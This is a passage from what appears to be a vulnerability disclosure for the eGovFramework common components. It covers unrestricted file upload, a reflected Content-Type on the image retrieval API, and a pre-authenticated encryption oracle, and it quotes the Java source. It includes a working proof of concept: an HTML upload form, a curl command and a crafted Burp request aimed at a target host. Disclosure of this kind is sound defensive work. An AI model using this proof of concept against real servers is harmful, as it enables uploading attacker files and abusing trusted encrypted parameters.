<span style="color: #666666">137</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;/utl/web/imageSrc.do?&quot;</span>
<span style="color: #666666">138</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;path=&quot;</span> <span style="color: #666666">+</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">encrypt</span><span style="color: #666666">(</span>vo<span style="color: #666666">.</span><span style="color: #7D9029">getServerSubPath</span><span style="color: #666666">())</span>
<span style="color: #666666">139</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;&amp;physical=&quot;</span> <span style="color: #666666">+</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">encrypt</span><span style="color: #666666">(</span>vo<span style="color: #666666">.</span><span style="color: #7D9029">getPhysicalName</span><span style="color: #666666">())</span>
<span style="color: #666666">140</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;&amp;contentType=&quot;</span> <span style="color: #666666">+</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">encrypt</span><span style="color: #666666">(</span>vo<span style="color: #666666">.</span><span style="color: #7D9029">getContentType</span><span style="color: #666666">());</span>
<span style="color: #666666">141</span> 
<span style="color: #666666">142</span>                                 model<span style="color: #666666">.</span><span style="color: #7D9029">addAttribute</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;url&quot;</span><span style="color: #666666">,</span> url<span style="color: #666666">);</span>
<span style="color: #666666">143</span>                                 model<span style="color: #666666">.</span><span style="color: #7D9029">addAttribute</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;msg&quot;</span><span style="color: #666666">,</span>egovMessageSource<span style="color: #666666">.</span><span style="color: #7D9029">getMessage</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;success.file.transfer&quot;</span><span style="color: #666666">));</span>
</pre></div>

<p>The file will not be directly accessible because the variables have been encrypted, probably following a security assessment carried out by KISA in 2017 and 2018.</p>
<p>By encrypting the variables, as long as the secret key is not known to the attackers (and is correctly set), it is impossible to exploit the following arbitrary file reading (lines 165 to 168) in the <code>/utl/web/imageSrc.do</code> API:</p>
<p>Content of <code>egovframe-common-components/src/main/java/egovframework/com/utl/wed/web/EgovWebEditorImageController.java</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">162</span>         <span style="color: #AA22FF">@RequestMapping</span><span style="color: #666666">(</span>value<span style="color: #666666">=</span><span style="color: #BA2121">&quot;/utl/web/imageSrc.do&quot;</span><span style="color: #666666">,</span>method<span style="color: #666666">=</span>RequestMethod<span style="color: #666666">.</span><span style="color: #7D9029">GET</span><span style="color: #666666">)</span>
<span style="color: #666666">163</span>         <span style="color: #008000; font-weight: bold">public</span> <span style="color: #B00040">void</span> <span style="color: #0000FF">download</span><span style="color: #666666">(</span>HttpServletRequest request<span style="color: #666666">,</span> HttpServletResponse response<span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throws</span> Exception <span style="color: #666666">{</span>
<span style="color: #666666">164</span>                 <span style="color: #408080; font-style: italic">//2017.12.12 - ?? ?? ?? ?? ??? ??</span>
<span style="color: #666666">165</span>                 <span style="color: #408080; font-style: italic">//KISA ???? ?? (2018-10-29, ???)</span>
<span style="color: #666666">166</span>                 String subPath <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">decrypt</span><span style="color: #666666">(</span>EgovStringUtil<span style="color: #666666">.</span><span style="color: #7D9029">isNullToString</span><span style="color: #666666">(</span>request<span style="color: #666666">.</span><span style="color: #7D9029">getParameter</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;path&quot;</span><span style="color: #666666">)));</span>
<span style="color: #666666">167</span>                 String physical <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">decrypt</span><span style="color: #666666">(</span>EgovStringUtil<span style="color: #666666">.</span><span style="color: #7D9029">isNullToString</span><span style="color: #666666">(</span>request<span style="color: #666666">.</span><span style="color: #7D9029">getParameter</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;physical&quot;</span><span style="color: #666666">)));</span>
<span style="color: #666666">168</span>                 String mimeType <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">decrypt</span><span style="color: #666666">(</span>EgovStringUtil<span style="color: #666666">.</span><span style="color: #7D9029">isNullToString</span><span style="color: #666666">(</span>request<span style="color: #666666">.</span><span style="color: #7D9029">getParameter</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;contentType&quot;</span><span style="color: #666666">)));</span>
<span style="color: #666666">169</span> 
<span style="color: #666666">170</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>subPath<span style="color: #666666">.</span><span style="color: #7D9029">indexOf</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;..&quot;</span><span style="color: #666666">)</span> <span style="color: #666666">&gt;=</span> <span style="color: #666666">0</span> <span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> Exception<span style="color: #666666">(</span><span style="color: #BA2121">&quot;Security Exception - illegal url called.&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">171</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>physical<span style="color: #666666">.</span><span style="color: #7D9029">indexOf</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;..&quot;</span><span style="color: #666666">)</span> <span style="color: #666666">&gt;=</span> <span style="color: #666666">0</span> <span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> Exception<span style="color: #666666">(</span><span style="color: #BA2121">&quot;Security Exception - illegal url called.&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">172</span> 
<span style="color: #666666">173</span>                 String ext <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">174</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span> physical<span style="color: #666666">.</span><span style="color: #7D9029">lastIndexOf</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;.&quot;</span><span style="color: #666666">)</span> <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span> <span style="color: #666666">)</span>
<span style="color: #666666">175</span>                         ext <span style="color: #666666">=</span> physical<span style="color: #666666">.</span><span style="color: #7D9029">substring</span><span style="color: #666666">(</span>physical<span style="color: #666666">.</span><span style="color: #7D9029">lastIndexOf</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;.&quot;</span><span style="color: #666666">)</span> <span style="color: #666666">+</span> <span style="color: #666666">1,</span>physical<span style="color: #666666">.</span><span style="color: #7D9029">length</span><span style="color: #666666">()).</span><span style="color: #7D9029">toLowerCase</span><span style="color: #666666">();</span>
<span style="color: #666666">176</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span> ext <span style="color: #666666">==</span> <span style="color: #008000; font-weight: bold">null</span> <span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> FileNotFoundException<span style="color: #666666">();</span>
<span style="color: #666666">177</span> 
<span style="color: #666666">178</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span> extWhiteList<span style="color: #666666">.</span><span style="color: #7D9029">indexOf</span><span style="color: #666666">(</span>ext<span style="color: #666666">)</span> <span style="color: #666666">&gt;=</span> <span style="color: #666666">0</span> <span style="color: #666666">)</span>
<span style="color: #666666">179</span>                         EgovFormBasedFileUtil<span style="color: #666666">.</span><span style="color: #7D9029">viewFile</span><span style="color: #666666">(</span>response<span style="color: #666666">,</span> uploadDir<span style="color: #666666">,</span> subPath<span style="color: #666666">,</span> physical<span style="color: #666666">,</span> mimeType<span style="color: #666666">);</span>
<span style="color: #666666">180</span>                 <span style="color: #008000; font-weight: bold">else</span>
<span style="color: #666666">181</span>                         <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> FileNotFoundException<span style="color: #666666">();</span>
<span style="color: #666666">182</span>         <span style="color: #666666">}</span>
</pre></div>

<p>The <code>/utl/web/imageSrc.do</code> API allows to retrieve the uploaded file with the 3 encrypted values below, returned at the end of the upload process:</p>
<ul>
<li>path;</li>
<li>physical;</li>
<li>contentType.</li>
</ul>
<p>By visiting the displayed URL containing the 3 encrypted values, we can retrieve the uploaded document.</p>
<p>Regarding the reflected <code>Content-Type</code>, it is worth noting that a protection was added to the <code>viewFile()</code> method in June 2023.</p>
<p>It is unclear whether this was an attempt to fix the upload vulnerability (fixing the consequences instead of the root cause is usually ineffective - you can still upload whatever you want). A whitelist was implemented to allow only specific MIME types. Thus, anything other than <code>image/gif</code>, <code>image/jpg</code>, <code>image/jpeg</code>, and <code>image/png</code> will appear as an <code>application/octet-stream</code>:</p>
<p>The changelog is:</p>
<pre><code>* 2023.06.27 Kim Hye-jun NSR Security Measures (Script Execution Vulnerability in CKEditor Image Viewing Function)
</code></pre>
<p>My initial analysis was actually performed in March 2023, before this commit and I believe this is an attempt to incorrectly patch the vulnerability (since the initial analysis was given to POC Security and shared with KISA in April 2023).
At that time, the <a href="https://github.com/eGovFramework/egovframe-common-components/blame/e7b8d0df75664ce71781720801fa1ae2d7302a58/src/main/java/egovframework/com/utl/fcc/service/EgovFormBasedFileUtil.java#L277">following mimeType verification was not implemented</a>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">218</span>         <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">void</span> <span style="color: #0000FF">viewFile</span><span style="color: #666666">(</span>HttpServletResponse response<span style="color: #666666">,</span> String where<span style="color: #666666">,</span> String serverSubPath<span style="color: #666666">,</span> String physicalName<span style="color: #666666">,</span>
<span style="color: #666666">219</span>                         String mimeTypeParam<span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throws</span> Exception <span style="color: #666666">{</span>
<span style="color: #666666">220</span>                 String mimeType <span style="color: #666666">=</span> mimeTypeParam<span style="color: #666666">;</span>
<span style="color: #666666">221</span>                 String downFileName <span style="color: #666666">=</span> where <span style="color: #666666">+</span> SEPERATOR <span style="color: #666666">+</span> serverSubPath <span style="color: #666666">+</span> SEPERATOR <span style="color: #666666">+</span> physicalName <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;_upfile&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">[...]</span>
<span style="color: #666666">239</span>                 <span style="color: #B00040">boolean</span> contentTypeFlag <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">false</span><span style="color: #666666">;</span>
<span style="color: #666666">240</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>mimeType <span style="color: #666666">!=</span> <span style="color: #008000; font-weight: bold">null</span><span style="color: #666666">)</span> <span style="color: #666666">{</span>
<span style="color: #666666">241</span>                         Map<span style="color: #666666">&lt;</span>String<span style="color: #666666">,</span> String<span style="color: #666666">&gt;</span> contentTypeWL <span style="color: #666666">=</span> getContentTypeWL<span style="color: #666666">();</span>
<span style="color: #666666">242</span>                         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>contentTypeWL <span style="color: #666666">!=</span> <span style="color: #008000; font-weight: bold">null</span><span style="color: #666666">)</span> <span style="color: #666666">{</span>
<span style="color: #666666">243</span>                                 <span style="color: #008000; font-weight: bold">for</span> <span style="color: #666666">(</span>String ext <span style="color: #666666">:</span> contentTypeWL<span style="color: #666666">.</span><span style="color: #7D9029">keySet</span><span style="color: #666666">())</span> <span style="color: #666666">{</span>
<span style="color: #666666">244</span>                                         String matchMimeType <span style="color: #666666">=</span> contentTypeWL<span style="color: #666666">.</span><span style="color: #7D9029">get</span><span style="color: #666666">(</span>ext<span style="color: #666666">);</span>
<span style="color: #666666">245</span>                                         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>matchMimeType<span style="color: #666666">.</span><span style="color: #7D9029">equals</span><span style="color: #666666">(</span>mimeType<span style="color: #666666">))</span> <span style="color: #666666">{</span>

<span style="color: #408080; font-style: italic">// if the provided mimeType was found in the hash table (line 262), contentTypeFlag is set to true</span>

<span style="color: #666666">246</span>                                                 response<span style="color: #666666">.</span><span style="color: #7D9029">setContentType</span><span style="color: #666666">(</span>matchMimeType<span style="color: #666666">);</span> 
<span style="color: #666666">247</span>                                                 contentTypeFlag <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">true</span><span style="color: #666666">;</span>
<span style="color: #666666">248</span>                                                 <span style="color: #008000; font-weight: bold">break</span><span style="color: #666666">;</span>
<span style="color: #666666">249</span>                                         <span style="color: #666666">}</span>
<span style="color: #666666">250</span>                                 <span style="color: #666666">}</span>
<span style="color: #666666">251</span>                         <span style="color: #666666">}</span>
<span style="color: #666666">252</span>                 <span style="color: #666666">}</span>

<span style="color: #408080; font-style: italic">// application/octet-stream is used if the contentTypeFlag is still false</span>

<span style="color: #666666">253</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(!</span>contentTypeFlag<span style="color: #666666">)</span> <span style="color: #666666">{</span>
<span style="color: #666666">254</span>                         response<span style="color: #666666">.</span><span style="color: #7D9029">setContentType</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;application/octet-stream;&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">255</span>                 <span style="color: #666666">}</span>
<span style="color: #666666">256</span>
<span style="color: #666666">257</span>                 response<span style="color: #666666">.</span><span style="color: #7D9029">setHeader</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;Content-Disposition&quot;</span><span style="color: #666666">,</span> <span style="color: #BA2121">&quot;filename=image;&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">258</span>
<span style="color: #666666">259</span>                 FileCopyUtils<span style="color: #666666">.</span><span style="color: #7D9029">copy</span><span style="color: #666666">(</span><span style="color: #008000; font-weight: bold">new</span> FileInputStream<span style="color: #666666">(</span>file<span style="color: #666666">),</span> response<span style="color: #666666">.</span><span style="color: #7D9029">getOutputStream</span><span style="color: #666666">());</span>
<span style="color: #666666">260</span>         <span style="color: #666666">}</span>
<span style="color: #666666">261</span>
<span style="color: #666666">262</span>         <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> Map<span style="color: #666666">&lt;</span>String<span style="color: #666666">,</span> String<span style="color: #666666">&gt;</span> <span style="color: #0000FF">getContentTypeWL</span><span style="color: #666666">()</span> <span style="color: #666666">{</span>
<span style="color: #666666">263</span>                 Map<span style="color: #666666">&lt;</span>String<span style="color: #666666">,</span> String<span style="color: #666666">&gt;</span> contentTypeWL <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> HashMap<span style="color: #666666">&lt;&gt;();</span>
<span style="color: #666666">264</span>
<span style="color: #666666">265</span>                 contentTypeWL<span style="color: #666666">.</span><span style="color: #7D9029">put</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;gif&quot;</span><span style="color: #666666">,</span> <span style="color: #BA2121">&quot;image/gif&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">266</span>                 contentTypeWL<span style="color: #666666">.</span><span style="color: #7D9029">put</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;jpg&quot;</span><span style="color: #666666">,</span> <span style="color: #BA2121">&quot;image/jpg&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">267</span>                 contentTypeWL<span style="color: #666666">.</span><span style="color: #7D9029">put</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;jpeg&quot;</span><span style="color: #666666">,</span> <span style="color: #BA2121">&quot;image/jpeg&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">268</span>                 contentTypeWL<span style="color: #666666">.</span><span style="color: #7D9029">put</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;png&quot;</span><span style="color: #666666">,</span> <span style="color: #BA2121">&quot;image/png&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">269</span>
<span style="color: #666666">270</span>                 <span style="color: #008000; font-weight: bold">return</span> contentTypeWL<span style="color: #666666">;</span>
<span style="color: #666666">271</span>         <span style="color: #666666">}</span>
<span style="color: #666666">272</span> <span style="color: #666666">}</span>
</pre></div>

<p>However, this modification does not fix the root cause (file upload) and it is still possible to upload any file and download them (with a resulting <code>application/octet-stream</code> as the Content-Type).</p>
<p>PoC:</p>
<p>Exploit is attached. Just change 192.168.0.1 to the targeted URL, visit this webpage and upload any file:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>&lt;<span style="color: #008000; font-weight: bold">html</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">head</span>&gt;
&lt;/<span style="color: #008000; font-weight: bold">head</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">body</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">form</span> <span style="color: #7D9029">action</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;http://192.168.0.1/utl/wed/insertImageCk.do&quot;</span> <span style="color: #7D9029">method</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;post&quot;</span> <span style="color: #7D9029">enctype</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;multipart/form-data&quot;</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">label</span> <span style="color: #7D9029">for</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;file&quot;</span>&gt;Filename:&lt;/<span style="color: #008000; font-weight: bold">label</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">input</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;file&quot;</span> <span style="color: #7D9029">name</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;file&quot;</span> <span style="color: #7D9029">id</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;file&quot;</span> /&gt;
&lt;<span style="color: #008000; font-weight: bold">br</span> /&gt;
&lt;<span style="color: #008000; font-weight: bold">input</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;submit&quot;</span> <span style="color: #7D9029">name</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;submit&quot;</span> <span style="color: #7D9029">value</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;Submit&quot;</span> /&gt;
&lt;/<span style="color: #008000; font-weight: bold">form</span>&gt;
&lt;/<span style="color: #008000; font-weight: bold">body</span>&gt;
&lt;/<span style="color: #008000; font-weight: bold">html</span>&gt;
</pre></div>

<p>The API will return the resulting path of the file reachable using <code>/utl/web/imageSrc.do</code> directly in the browser.</p>
<p>Curl can also be used but a proxy, e.g. Burp Suite, is required to edit the <code>Content-Type</code> on the fly (<code>Content-Type</code> will be set to <code>text/plain</code> if a <code>.txt</code> file is uploaded, <code>image/jpeg</code> for a <code>.jpg</code> file, <code>text/html</code> if a <code>.html</code> file is uploaded). </p>
<pre><code>kali% curl -kv -F "file=@1.txt; filename=1.txt" http://192.168.0.1/utl/wed/insertImageCk.do
</code></pre>
<p>BURP request:</p>
<pre><code>POST /utl/wed/insertImageCk.do HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------26979662282534656852357513795
Content-Length: 345
Connection: close
Upgrade-Insecure-Requests: 1


-----------------------------26979662282534656852357513795
Content-Disposition: form-data; name="file"; filename="1.png" &lt;- The filename that must contain an allowed extension
Content-Type: text/html &lt;--------------------------------------- Content-Type that will be used

11111111111 &lt;--------------------------------------------------- Content of the file, actually unrelated to the previous extension
-----------------------------26979662282534656852357513795
Content-Disposition: form-data; name="submit"



Submit
-----------------------------26979662282534656852357513795--
</code></pre>
<p>An attacker can upload any document and control the Content-Type that will be used when retrieving the file using the API <code>/utl/web/imageSrc.do</code>.</p>
<p><a id="oracle"></a></p>
<h2>Details - Pre-authenticated Cryptographic Oracle</h2>
<p>The previous upload form can be used as a cryptographic oracle. This form will happily return encrypted values for plain-text values defined by the attacker.</p>
<p>These encrypted variables will then be completely trusted by the application.</p>
<p>At line 139 and 140, it is possible to use this encryption oracle to receive the encrypted string of any filename and content-type controlled by an attacker, by sending a custom Content-type or a custom filename in the upload form using the <code>/utl/wed/insertImage.do</code> and <code>/utl/wed/insertImageCk.do</code> APIs (calling the <code>uploadImageFiles()</code> method):</p>
<p>Content of <code>egovframe-common-components/src/main/java/egovframework/com/utl/wed/web/EgovWebEditorImageController.java</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">137</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;/utl/web/imageSrc.do?&quot;</span>
<span style="color: #666666">138</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;path=&quot;</span> <span style="color: #666666">+</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">encrypt</span><span style="color: #666666">(</span>vo<span style="color: #666666">.</span><span style="color: #7D9029">getServerSubPath</span><span style="color: #666666">())</span>
<span style="color: #666666">139</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;&amp;physical=&quot;</span> <span style="color: #666666">+</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">encrypt</span><span style="color: #666666">(</span>vo<span style="color: #666666">.</span><span style="color: #7D9029">getPhysicalName</span><span style="color: #666666">())</span>
<span style="color: #666666">140</span>                                                 <span style="color: #666666">+</span> <span style="color: #BA2121">&quot;&amp;contentType=&quot;</span> <span style="color: #666666">+</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">encrypt</span><span style="color: #666666">(</span>vo<span style="color: #666666">.</span><span style="color: #7D9029">getContentType</span><span style="color: #666666">());</span>
<span style="color: #666666">141</span> 
<span style="color: #666666">142</span>                                 model<span style="color: #666666">.</span><span style="color: #7D9029">addAttribute</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;url&quot;</span><span style="color: #666666">,</span> url<span style="color: #666666">);</span>
<span style="color: #666666">143</span>                                 model<span style="color: #666666">.</span><span style="color: #7D9029">addAttribute</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;msg&quot;</span><span style="color: #666666">,</span>egovMessageSource<span style="color: #666666">.</span><span style="color: #7D9029">getMessage</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;success.file.transfer&quot;</span><span style="color: #666666">));</span>
</pre></div>

<p>An attacker can send malicious Content-type or filename variables: these strings will be encrypted using the method <code>encrypt()</code> with a secret key defined server-side.</p>
<p>The resulting URL displayed on the webpage will contain the encoded <code>contentType</code> and <code>Filename</code> after submitting the upload form.</p>
<p>Then, an attacker can use the encrypted-malicious strings to abuse internal services.</p>
<p>For example, the <code>/utl/web/imageSrc.do</code> API relies on encrypted data to read files in the filesystem: an attacker can use encrypted malicious strings (e.g. <code>subPath</code>, <code>physical</code> and <code>mimeType</code> variables) with the <code>/utl/web/imageSrc.do</code> API, these variables will be decrypted, corresponding to specific attacker-controlled strings (lines 166 to 188):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">162</span>         <span style="color: #AA22FF">@RequestMapping</span><span style="color: #666666">(</span>value<span style="color: #666666">=</span><span style="color: #BA2121">&quot;/utl/web/imageSrc.do&quot;</span><span style="color: #666666">,</span>method<span style="color: #666666">=</span>RequestMethod<span style="color: #666666">.</span><span style="color: #7D9029">GET</span><span style="color: #666666">)</span>
<span style="color: #666666">163</span>         <span style="color: #008000; font-weight: bold">public</span> <span style="color: #B00040">void</span> <span style="color: #0000FF">download</span><span style="color: #666666">(</span>HttpServletRequest request<span style="color: #666666">,</span> HttpServletResponse response<span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throws</span> Exception <span style="color: #666666">{</span>
<span style="color: #666666">164</span>                 <span style="color: #408080; font-style: italic">//2017.12.12 - ??</span>
<span style="color: #666666">165</span>                 <span style="color: #408080; font-style: italic">//KISA ?? (2018-10-29, ???</span>
<span style="color: #666666">166</span>                 String subPath <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">decrypt</span><span style="color: #666666">(</span>EgovStringUtil<span style="color: #666666">.</span><span style="color: #7D9029">isNullToString</span><span style="color: #666666">(</span>request<span style="color: #666666">.</span><span style="color: #7D9029">getParameter</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;path&quot;</span><span style="color: #666666">)));</span> <span style="color: #666666">&lt;----------------------</span> controlled by an attacker
<span style="color: #666666">167</span>                 String physical <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">decrypt</span><span style="color: #666666">(</span>EgovStringUtil<span style="color: #666666">.</span><span style="color: #7D9029">isNullToString</span><span style="color: #666666">(</span>request<span style="color: #666666">.</span><span style="color: #7D9029">getParameter</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;physical&quot;</span><span style="color: #666666">)));</span> <span style="color: #666666">&lt;-----------------</span> controlled by an attacker
<span style="color: #666666">168</span>                 String mimeType <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">this</span><span style="color: #666666">.</span><span style="color: #7D9029">decrypt</span><span style="color: #666666">(</span>EgovStringUtil<span style="color: #666666">.</span><span style="color: #7D9029">isNullToString</span><span style="color: #666666">(</span>request<span style="color: #666666">.</span><span style="color: #7D9029">getParameter</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;contentType&quot;</span><span style="color: #666666">)));</span> <span style="color: #666666">&lt;--------------</span> controlled by an attacker
<span style="color: #666666">169</span> 
<span style="color: #666666">170</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>subPath<span style="color: #666666">.</span><span style="color: #7D9029">indexOf</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;..&quot;</span><span style="color: #666666">)</span> <span style="color: #666666">&gt;=</span> <span style="color: #666666">0</span> <span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> Exception<span style="color: #666666">(</span><span style="color: #BA2121">&quot;Security Exception - illegal url called.&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">171</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>physical<span style="color: #666666">.</span><span style="color: #7D9029">indexOf</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;..&quot;</span><span style="color: #666666">)</span> <span style="color: #666666">&gt;=</span> <span style="color: #666666">0</span> <span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> Exception<span style="color: #666666">(</span><span style="color: #BA2121">&quot;Security Exception - illegal url called.&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">172</span> 
<span style="color: #666666">173</span>                 String ext <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">174</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span> physical<span style="color: #666666">.</span><span style="color: #7D9029">lastIndexOf</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;.&quot;</span><span style="color: #666666">)</span> <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span> <span style="color: #666666">)</span>
<span style="color: #666666">175</span>                         ext <span style="color: #666666">=</span> physical<span style="color: #666666">.</span><span style="color: #7D9029">substring</span><span style="color: #666666">(</span>physical<span style="color: #666666">.</span><span style="color: #7D9029">lastIndexOf</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;.&quot;</span><span style="color: #666666">)</span> <span style="color: #666666">+</span> <span style="color: #666666">1,</span>physical<span style="color: #666666">.</span><span style="color: #7D9029">length</span><span style="color: #666666">()).</span><span style="color: #7D9029">toLowerCase</span><span style="color: #666666">();</span>
<span style="color: #666666">176</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span> ext <span style="color: #666666">==</span> <span style="color: #008000; font-weight: bold">null</span> <span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> FileNotFoundException<span style="color: #666666">();</span>
<span style="color: #666666">177</span> 
<span style="color: #666666">178</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span> extWhiteList<span style="color: #666666">.</span><span style="color: #7D9029">indexOf</span><span style="color: #666666">(</span>ext<span style="color: #666666">)</span> <span style="color: #666666">&gt;=</span> <span style="color: #666666">0</span> <span style="color: #666666">)</span>
<span style="color: #666666">179</span>                         EgovFormBasedFileUtil<span style="color: #666666">.</span><span style="color: #7D9029">viewFile</span><span style="color: #666666">(</span>response<span style="color: #666666">,</span> uploadDir<span style="color: #666666">,</span> subPath<span style="color: #666666">,</span> physical<span style="color: #666666">,</span> mimeType<span style="color: #666666">);</span>
<span style="color: #666666">180</span>                 <span style="color: #008000; font-weight: bold">else</span>
<span style="color: #666666">181</span>                         <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> FileNotFoundException<span style="color: #666666">();</span>
<span style="color: #666666">182</span>         <span style="color: #666666">}</span>
</pre></div>

